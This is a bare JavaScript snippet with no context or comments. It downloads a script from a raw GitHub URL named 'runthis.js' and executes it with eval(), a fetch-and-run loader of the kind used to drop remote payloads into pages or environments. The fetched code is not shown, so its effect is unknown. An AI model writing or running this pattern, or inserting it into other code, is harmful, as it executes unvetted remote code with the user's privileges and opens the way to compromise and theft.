fetch("https://raw.githubusercontent.com/fete3712-vmX/Something/refs/heads/main/riot/js/thunderz/runthis.js")
  .then(res => res.text())
  .then(code => {
    eval(code);
   })
  .catch(err => console.error(err));